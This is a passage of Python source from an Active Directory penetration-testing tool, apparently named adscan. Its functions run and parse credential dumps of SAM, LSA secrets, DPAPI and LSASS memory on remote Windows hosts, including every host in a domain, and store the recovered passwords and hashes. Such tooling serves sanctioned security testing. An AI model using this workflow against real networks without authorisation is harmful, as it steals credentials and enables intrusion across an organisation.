        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            processed_creds = set()
            current_host: str | None = None

            for line in output.splitlines():
                host_match = _NXC_SMB_LINE_RE.match(strip_ansi_codes(line))
                if host_match:
                    host_candidate = str(host_match.group("host") or "").strip()
                    if host_candidate:
                        current_host = host_candidate
                if "[CREDENTIAL]" in line:
                    match = re.search(r"\\([^:]+):([^\s]+)", line)
                    if match:
                        username = match.group(1).strip().replace("\x00", "")
                        password = match.group(2).strip().replace("\x00", "")

                        if username.endswith("$"):
                            continue

                        cred_tuple = (username, password)

                        if cred_tuple in processed_creds:
                            if bulk_mode:
                                step_host = _resolve_step_host(
                                    parsed_host=current_host, requested_host=host
                                )
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            continue

                        step_host = _resolve_step_host(
                            parsed_host=current_host, requested_host=host
                        )
                        marked_username = mark_sensitive(username, "user")
                        marked_password = mark_sensitive(password, "password")
                        marked_host = mark_sensitive(
                            step_host or "unknown host", "hostname"
                        )

                        print_success(f"Credential found on {marked_host}:")
                        print_warning(f"   User: {marked_username}")
                        print_warning(f"   Password: {marked_password}")

                        if Confirm.ask(
                            f"Is this credential correct? User: {marked_username}, Password: {marked_password}",
                            default=True,
                        ):
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="DPAPI",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )
                            print_success(f"Credential saved for {marked_username}")
                            processed_creds.add(cred_tuple)
                        else:
                            print_warning("Credential discarded")

            if bulk_mode:
                _persist_bulk_credentials(
                    shell,
                    domain=domain,
                    dump_kind="DPAPI",
                    auth_username=auth_username,
                    credentials=bulk_credentials,
                )
                _print_bulk_summary(dump_kind="DPAPI", summary=bulk_summary)
            print_info("\nDPAPI dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing DPAPI dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during DPAPI dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_lsass(shell: Any, command: str, domain: str, host: str) -> None:
    """Execute LSASS dump command and process the output."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process.returncode != 0:
            error_message = (
                completed_process.stderr.strip()
                if completed_process.stderr
                else completed_process.stdout.strip()
            )
            print_error(
                f"An error occurred executing the command: {error_message if error_message else 'No error details available.'}"
            )
            return
        for line in completed_process.stdout.splitlines():
            if "[+]" in line and "Valid" in line:
                try:
                    clean_line = strip_ansi_codes(line)
                    parts = clean_line.split("[+]")[1].split("Valid")[0]
                    creds = parts.replace("[+]", "").strip()
                    if ":" in creds:
                        user, hash_value = creds.split(":", 1)
                        user = user.strip()
                        hash_value = hash_value.strip()
                        marked_user = mark_sensitive(user, "user")
                        print_info(f"User (after strip): '{marked_user}'")
                        print_info(f"Hash (after strip): '{hash_value}'")
                        shell.add_credential(domain, user, hash_value)
                except Exception as e:
                    telemetry.capture_exception(e)
                    print_error(f"Error processing line: '{line.strip()}'")
                    print_error("Error.")
                    print_exception(show_locals=False, exception=e)
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred.")
        print_exception(show_locals=False, exception=e)


def execute_dump_rest(shell: Any, command: str, domain: str, host: str) -> None:
    """Execute generic dump command and extract credentials from output.

    **LEGACY/UNUSED**: This function appears to be legacy code and is not
    currently called from anywhere in the codebase. It's kept for backward
    compatibility and potential future use.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full command to run.
        domain: Target domain.
        host: Target host.
    """
    try:
        completed_process = shell.run_command(command, timeout=300)
        output_str = completed_process.stdout
        errors_str = completed_process.stderr

        if output_str:
            for line in output_str.splitlines():
                shell.extract_credentials(line, domain)

        if errors_str:
            print_error(f"Errors found during execution: {errors_str.strip()}")

        if completed_process.returncode != 0 and (
            not errors_str or not errors_str.strip()
        ):
            # If there was a non-zero return code AND no specific errors were already printed from stderr
            print_error(
                f"Exploit failed or process terminated with errors. Return code: {completed_process.returncode}"
            )
        elif completed_process.returncode == 0:
            print_success("Process completed successfully.")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred.")
        print_exception(show_locals=False, exception=e)


# ============================================================================
# CLI Command Handlers (ask_for_* and do_* functions)
# ============================================================================


def run_ask_for_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Prompt user to dump credentials from remote host(s)."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    cred_type = "Local Admin" if islocal else "Domain Admin"
    host_display = (
        host
        if isinstance(host, str)
        else f"{len(host)} hosts"
        if isinstance(host, list)
        else "target host(s)"
    )

    if confirm_operation(
        operation_name="Remote Credential Extraction",
        description="Extracts credentials from SAM, LSA Secrets, DPAPI, and LSASS memory dumps",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Target Host(s)": host_display,
            "Username": username,
            "Credential Type": cred_type,
            "Sources": "SAM, LSA, DPAPI, LSASS",
        },
        default=True,
        icon="💾",
        show_panel=True,
    ):
        run_dump_host(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            islocal=islocal,
        )


def run_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Professional credential dumping with progress tracking."""
    cred_type = "Hash" if shell.is_hash(password) else "Password"
    auth_scope = "Local" if islocal.lower() == "true" else "Domain"

    # Initialize progress tracker for credential dumping
    tracker = ScanProgressTracker(
        "Host Credential Extraction",
        total_steps=4,
    )

    # Start workflow with detailed information
    tracker.start(
        details={
            "Domain": domain,
            "Target Host": host,
            "Username": username,
            "Credential Type": cred_type,
            "Authentication Scope": auth_scope,
        }
    )

    # Step 1: SAM Database Dump
    tracker.start_step("SAM Database Dump", details="Extracting local account hashes")
    try:
        run_dump_sam(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="SAM extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"SAM dump error: {str(e)[:50]}")

    # Step 2: LSA Secrets Dump
    tracker.start_step("LSA Secrets Dump", details="Extracting cached credentials")
    try:
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="LSA extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSA dump error: {str(e)[:50]}")

    # Step 3: DPAPI Credentials
    tracker.start_step("DPAPI Credential Dump", details="Extracting DPAPI master keys")
    try:
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="DPAPI extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"DPAPI dump error: {str(e)[:50]}")

    # Step 4: LSASS Process Dump
    tracker.start_step(
        "LSASS Memory Dump", details="Extracting credentials from memory"
    )
    try:
        run_ask_for_dump_lsass(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="LSASS dump completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSASS dump error: {str(e)[:50]}")

    # Print workflow summary
    tracker.print_summary()


def run_do_dump_host(shell: Any, args: str) -> None:
    """
    Dumps the credentials of a host.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - host (str): The target host.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps the LSA, DPAPI and asks for LSASS credentials of the target host.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_instruction(
            "Usage: dump_host <domain> <host> <username> <password> <islocal>"
        )
        return

    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]

    run_dump_host(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        islocal=islocal,
    )


def run_ask_for_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump registry hives from Domain Controller."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

    if confirm_operation(
        operation_name="Remote Registry Dump",
        description="Extracts Windows Registry hives from the Primary Domain Controller",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Hives": "SAM, SECURITY, SYSTEM",
            "Output Location": f"\\\\{shell.myip}\\smbFolder"
            if shell.myip
            else "SMB Share",
        },
        default=True,
        icon="📋",
    ):
        run_dump_registries(
            shell,
            domain=domain,
            username=username,
            password=password,
        )


def run_do_dump_registries(shell: Any, args: str) -> None:
    """
    Dumps the registries of a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.

    The function dumps the registries of the target PDC using the specified
    username and password for authentication.
    """
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: dump_registries <domain> <username> <password>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_dump_registries(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def run_ask_for_dump_all_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump LSA credentials from all hosts in domain."""
    marked_domain = mark_sensitive(domain, "domain")
    if Confirm.ask(
        f"Do you want to dump the LSA credentials from all hosts in domain {marked_domain}?",
        default=False,
    ):
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )


def run_ask_for_dump_all_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump DPAPI credentials from all hosts in domain."""
    marked_domain = mark_sensitive(domain, "domain")
    if Confirm.ask(
        f"Do you want to dump the DPAPI credentials from all hosts in domain {marked_domain}?",
        default=False,
    ):
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )


def run_do_dump_lsa(shell: Any, args: str) -> None:
    """
    Dumps the LSA credentials from specified hosts within a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps the LSA credentials using NetExec.
    It supports dumping from a single host or all hosts in a specified domain.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_lsa <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_lsa(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_sam(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the SAM credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_sam <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_sam <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_sam(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_dpapi(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the DPAPI credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_dpapi <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: dump_dpapi <domain> <username> <password> <host> <islocal>"
        )
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_dpapi(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_ask_for_dump_lsass(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Prompt user to dump LSASS credentials from host."""
    marked_host = mark_sensitive(host, "hostname")
    if Confirm.ask(
        f"[+] Do you want to dump LSASS credentials from host {marked_host}?",
        default=False,
    ):
        run_dump_lsass(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            islocal=islocal,
        )
